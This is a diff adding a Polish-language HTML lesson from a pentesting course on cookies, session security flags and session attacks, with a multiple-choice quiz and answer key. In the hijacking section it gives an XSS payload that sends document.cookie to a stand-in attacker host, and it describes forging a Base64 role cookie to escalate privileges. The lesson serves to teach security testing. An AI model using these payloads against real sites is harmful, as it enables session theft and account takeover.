@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="pl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lekcja 03: Cookies & Sesje - Kurs Pentestera</title>
+
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        /* Akcent dla tej lekcji: Neon Pink/Red (Critical Data) */
+        :root {
+            --accent: #ff0055;
+            --accent-glow: rgba(255, 0, 85, 0.3);
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <header>
+            <h1>COOKIES & SESJE</h1>
+            <p>MODUŁ 03: Zarządzanie stanem, Flagi i Kradzież Tożsamości</p>
+        </header>
+
+        <!-- 1. PROBLEM -->
+        <section>
+            <h2>> PROBLEM "NIEPAMIĘCI"</h2>
+            <p>Protokół HTTP jest <strong>bezstanowy (stateless)</strong>. Serwer domyślnie nie pamięta, że zapytanie nr
+                2 pochodzi od tej samej osoby, co zapytanie nr 1.</p>
+
+            <div class="card">
+                <h3>ROZWIĄZANIE: CIASTECZKA (COOKIES)</h3>
+                <p>Aby "zalogować" użytkownika, serwer wystawia mu unikalny identyfikator (Session ID) i każe
+                    przeglądarce odsyłać go przy każdym kolejnym kliknięciu.</p>
+                <pre><code><span class="comment"># Serwer wysyła rozkaz ustawienia ciasteczka:</span>
+Set-Cookie: session_id=abc123xyz; Path=/; HttpOnly; Secure</code></pre>
+            </div>
+        </section>
+
+        <!-- 2. ANATOMIA -->
+        <section>
+            <h2>> FLAGI BEZPIECZEŃSTWA</h2>
+            <p>To najważniejsza tabela w tej lekcji. Brak którejkolwiek z tych flag w ciasteczku sesyjnym to zazwyczaj
+                błąd bezpieczeństwa.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flaga</th>
+                        <th>Co robi?</th>
+                        <th>Znaczenie dla Pentestera</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="highlight">HttpOnly</span></td>
+                        <td>Blokuje dostęp JavaScriptu do ciastka.</td>
+                        <td><strong style="color:var(--success)">Kluczowa ochrona przed kradzieżą sesji przez
+                                XSS.</strong> Jeśli jej brakuje -> Zgłaszasz błąd.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="highlight">Secure</span></td>
+                        <td>Wymusza przesyłanie tylko po HTTPS.</td>
+                        <td>Chroni przed podsłuchem w sieciach otwartych (Wi-Fi).</td>
+                    </tr>
+                    <tr>
+                        <td><span class="highlight">SameSite</span></td>
+                        <td>(Strict/Lax/None) Ogranicza wysyłanie przy żądaniach z innych stron.</td>
+                        <td>Główna linia obrony przed <strong>CSRF</strong>.</td>
+                    </tr>
+                    <tr>
+                        <td>Domain</td>
+                        <td>Określa zasięg ciasteczka.</td>
+                        <td>Zbyt szeroki zakres (np. <code>.site.com</code>) może wyciekać sesję do subdomen (np.
+                            przejętych przez atakującego).</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- 3. ATAKI -->
+        <section>
+            <h2>> WEKTORY ATAKU NA SESJĘ</h2>
+            <p>Jak przejmujemy konta bez znajomości hasła?</p>
+
+            <div class="card">
+                <h3>1. SESSION HIJACKING (Kradzież sesji)</h3>
+                <p>Jeśli zdobędziesz <code>session_id</code> ofiary, jesteś ofiarą. Nie potrzebujesz jej loginu ani
+                    hasła.</p>
+                <ul>
+                    <li><strong>XSS:</strong> Jeśli brak flagi <code>HttpOnly</code>, wstrzykujesz:
+                        <code>&lt;script&gt;fetch('https://hacker.com?cookie='+document.cookie)&lt;/script&gt;</code>.
+                    </li>
+                    <li><strong>Network Sniffing:</strong> Jeśli brak flagi <code>Secure</code>, a ofiara jest w
+                        publicznym Wi-Fi, przechwytujesz ciastko z nagłówków HTTP.</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>2. SESSION FIXATION</h3>
+                <p>Atakujący wchodzi na stronę, dostaje sesję (np. ID: 999), a potem podrzuca ofierze link:
+                    <code>strona.com/?session_id=999</code>.</p>
+                <p><span class="highlight">Błąd:</span> Jeśli serwer po zalogowaniu ofiary <strong>nie zmieni
+                        identyfikatora sesji</strong>, atakujący (znając ID 999) wchodzi na konto ofiary.</p>
+            </div>
+
+            <div class="card">
+                <h3>3. SŁABE TOKENY (Predictable Tokens)</h3>
+                <p>Czasami <code>session_id</code> nie jest losowe.</p>
+                <pre><code><span class="comment"># Przykład w ciasteczku:</span>
+user_pref=dXNlcj1hZG1pbg==</code></pre>
+                <p>To kodowanie Base64. Po odkodowaniu: <code>user=admin</code>.
+                    <br><strong>Atak:</strong> Kodujesz <code>user=root</code> w Base64, podmieniasz ciastko i
+                    odświeżasz stronę. Jesteś rootem (Privilege Escalation).
+                </p>
+            </div>
+        </section>
+
+        <!-- CHECKLIST -->
+        <section>
+            <h2>CHECKLISTA / RED FLAGS</h2>
+            <div class="card checklist-card">
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Brak flagi HttpOnly:</strong> Jeśli aplikacja ma podatność XSS, brak tej flagi zamienia
+                        "irytujący alert" w "przejęcie konta".</div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Brak rotacji sesji:</strong> Sesja (Cookie) przed zalogowaniem jest taka sama jak po
+                        zalogowaniu (Podatność na Fixation).</div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>SameSite=None:</strong> Otwarta furtka do ataków CSRF (chyba że są inne tokeny
+                        anty-CSRF).</div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Wrażliwe dane w ciastku:</strong> Przechowywanie roli, ID użytkownika czy (o zgrozo)
+                        hasła w ciastku, zamiast trzymać to po stronie serwera.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- QUIZ -->
+        <section id="quiz-section">
+            <h2>🎓 WERYFIKACJA WIEDZY</h2>
+            <div id="quiz-container"></div>
+        </section>
+
+        <footer>
+            <p style="text-align: center; margin-top: 50px; color: #555;">&copy; 2026 Kurs Pentestera | Moduł 03</p>
+        </footer>
+    </div>
+
+    <!-- DANE DO QUIZU -->
+    <script>
+        const quizData = [
+            {
+                question: "Dlaczego flaga 'HttpOnly' jest kluczowa dla bezpieczeństwa?",
+                options: [
+                    "Szyfruje ona ciasteczko algorytmem AES.",
+                    "Sprawia, że ciasteczko działa tylko na protokole HTTP (nie HTTPS).",
+                    "Blokuje dostęp do ciasteczka z poziomu JavaScript (document.cookie), uniemożliwiając jego kradzież przy ataku XSS.",
+                    "Wymusza wygaśnięcie sesji po zamknięciu karty."
+                ],
+                correct: 2,
+                explanation: "HttpOnly to instrukcja dla przeglądarki: 'Wysyłaj to ciastko do serwera, ale ukryj je przed skryptami JS'. To drastycznie ogranicza skutki ataków XSS."
+            },
+            {
+                type: "scenario",
+                question: "Podczas testu zauważasz ciastko o wartości: 'cm9sZT11c2Vy'. Co robisz?",
+                options: [
+                    "Zgłaszam wyciek hasła.",
+                    "Rozpoznaję Base64. Dekoduję ('role=user'). Próbuję zmienić na 'role=admin', zakodować ponownie i podmienić ciastko (Privilege Escalation).",
+                    "Ignoruję, to losowy hash.",
+                    "Próbuję wykonać atak SQL Injection w nagłówku Host."
+                ],
+                correct: 1,
+                explanation: "Ciągi kończące się na '=' to często Base64. Jeśli serwer trzyma uprawnienia w ciastku (Client-Side Storage) zamiast w bazie (Server-Side), można je sfałszować."
+            },
+            {
+                question: "Na czym polega atak Session Fixation?",
+                options: [
+                    "Na zgadywaniu hasła administratora.",
+                    "Na wymuszeniu na ofierze użycia identyfikatora sesji, który zna atakujący (np. przez link). Po zalogowaniu ofiary, atakujący wchodzi na to samo ID.",
+                    "Na zablokowaniu konta po zbyt wielu próbach logowania.",
+                    "Na przejęciu sesji przez niezabezpieczone Wi-Fi."
+                ],
+                correct: 1,
+                explanation: "Fixation polega na 'ustaleniu' (fixed) ID sesji przed zalogowaniem. Jeśli serwer nie nada nowego ID po zalogowaniu, atakujący i ofiara dzielą tę samą sesję."
+            },
+            {
+                question: "Która flaga chroni ciasteczko przed podsłuchem w otwartej sieci Wi-Fi?",
+                options: [
+                    "HttpOnly",
+                    "SameSite",
+                    "Secure",
+                    "Expires"
+                ],
+                correct: 2,
+                explanation: "Flaga Secure zapewnia, że ciasteczko zostanie wysłane TYLKO jeśli połączenie jest szyfrowane (HTTPS). W sieci HTTP ciastko nie zostanie dołączone."
+            },
+            {
+                type: "scenario",
+                question: "Znalazłeś lukę XSS na stronie banku. Próbujesz wyświetlić ciasteczka funkcją `alert(document.cookie)`, ale alert jest pusty. Jesteś zalogowany. Co to oznacza?",
+                options: [
+                    "Luka XSS nie działa.",
+                    "Bank wdrożył flagę HttpOnly dla ciasteczek sesyjnych, więc JS ich nie widzi.",
+                    "Przeglądarka zablokowała skrypt.",
+                    "Musisz użyć console.log zamiast alert."
+                ],
+                correct: 1,
+                explanation: "To dowód na działanie HttpOnly. Kod JS się wykonał (alert wyskoczył), ale nie miał dostępu do chronionych danych."
+            },
+            {
+                question: "Co robi flaga SameSite=Strict?",
+                options: [
+                    "Wymusza zmianę hasła co 30 dni.",
+                    "Blokuje wysłanie ciasteczka, jeśli żądanie pochodzi z innej strony (np. link w mailu). Chroni przed CSRF.",
+                    "Pozwala na wysyłanie ciasteczka do każdej domeny.",
+                    "Szyfruje treść ciasteczka."
+                ],
+                correct: 1,
+                explanation: "SameSite=Strict to bardzo silna ochrona. Ciasteczko jest wysyłane tylko wtedy, gdy użytkownik już jest na stronie, a nie gdy na nią wchodzi z zewnątrz."
+            },
+            {
+                question: "Gdzie w Burp Suite najłatwiej sprawdzić, czy identyfikator sesji jest losowy?",
+                options: [
+                    "W zakładce Decoder.",
+                    "W narzędziu Sequencer (analiza entropii tokenów).",
+                    "W skanerze podatności.",
+                    "W ustawieniach Proxy."
+                ],
+                correct: 1,
+                explanation: "Burp Sequencer pobiera tysiące tokenów i przeprowadza testy statystyczne, aby sprawdzić, czy są one rzeczywiście losowe i nieprzewidywalne."
+            },
+            {
+                type: "scenario",
+                question: "Widzisz nagłówek 'Set-Cookie: session=123; Domain=.example.com'. Co jest ryzykowne w atrybucie Domain?",
+                options: [
+                    "Nic, jest poprawny.",
+                    "Kropka na początku (wildcard) oznacza, że ciastko trafi też do wszystkich subdomen (np. dev.example.com). Jeśli atakujący przejmie subdomenę, ukradnie sesję.",
+                    "Domena powinna być adresem IP.",
+                    "To błąd składni."
+                ],
+                correct: 1,
+                explanation: "Zbyt szeroki zakres domeny (tzw. Loose Scoping) zwiększa powierzchnię ataku. Ciasteczka powinny być przypisane do konkretnego hosta (bez kropki na początku), jeśli to możliwe."
+            },
+            {
+                question: "Dlaczego HTTP jest nazywany protokołem bezstanowym?",
+                options: [
+                    "Bo nie działa w USA.",
+                    "Bo każde zapytanie jest niezależne i serwer nie pamięta poprzednich interakcji bez dodatkowych mechanizmów (Cookies).",
+                    "Bo nie posiada kodów błędów.",
+                    "Bo wymaga ciągłego połączenia."
+                ],
+                correct: 1,
+                explanation: "Stateless to natura HTTP. Ciasteczka to 'proteza' pamięci, którą dołożono później, aby umożliwić logowanie i sklepy internetowe."
+            },
+            {
+                question: "Co to jest 'Cookie Jar'?",
+                options: [
+                    "Plik z hasłami.",
+                    "Mechanizm w przeglądarce lub narzędziu pentesterskim do przechowywania i automatycznego wysyłania ciasteczek.",
+                    "Nazwa złośliwego oprogramowania.",
+                    "Rodzaj ataku DoS."
+                ],
+                correct: 1,
+                explanation: "Cookie Jar to magazyn ciasteczek. Dzięki niemu narzędzia takie jak Curl czy Burp mogą 'utrzymać sesję' podczas skanowania."
+            }
+        ];
+    </script>
+
+    <script src="quiz.js"></script>
+
+</body>
+
+</html>
